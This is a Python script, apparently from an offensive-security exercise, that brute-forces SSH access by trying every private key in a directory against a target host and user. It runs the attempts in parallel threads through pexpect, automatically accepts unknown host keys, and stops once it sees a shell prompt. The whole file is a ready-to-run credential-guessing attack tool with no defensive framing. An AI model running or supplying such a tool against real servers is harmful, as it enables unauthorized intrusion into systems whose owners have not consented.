import pexpect
import optparse
import os
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0
verbose = False


def print_verbose(message):
    if verbose is True:
        print(message)
    else:
        pass


def connect(user, host, keyfile, release):
    global Stop
    global Fails

    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'

        conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt

        child = pexpect.spawn(conn_str)

        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print_verbose("info: NewHost key detected, first time connecting to target server or key changed")
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:

            print('[-] Connection Closed By Remote Host')
            Fails += 1

        elif ret > 3:
            print_verbose("info: Key Found, Stopping Attack...")
            print('[+] Success. ' + str(keyfile))
            Stop = True

    finally:
        if release:
            connection_lock.release()


def main():
    # set up argument parser with options. help statements and details
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='pass_dir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-v', '--verbose', dest='verbose', default=False,
                      action='store_true', help='enable verbose output')

    (options, args) = parser.parse_args()

    host = options.tgtHost
    pass_dir = options.pass_dir
    user = options.user

    # set global verbosity operator to meet user input
    global verbose
    verbose = options.verbose

    if host is None or pass_dir is None or user is None:
        print(parser.usage)
        exit(0)

    print_verbose("info: Execution Starting....")
    print_verbose("info: Attacking Host: " + host + "\nUsing Keylist: " + pass_dir)

    for filename in os.listdir(pass_dir):
        if Stop:
            print('[*] Exiting: Key Found.')
            exit(0)

        if Fails > 5:
            print('[!] Exiting: ' + 'Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)

        connection_lock.acquire()

        fullpath = os.path.join(pass_dir, filename)
        print('[-] Testing keyfile ' + str(fullpath))

        t = Thread(target=connect, args=(user, host, fullpath, True))
        t.start()


if __name__ == '__main__':
    main()
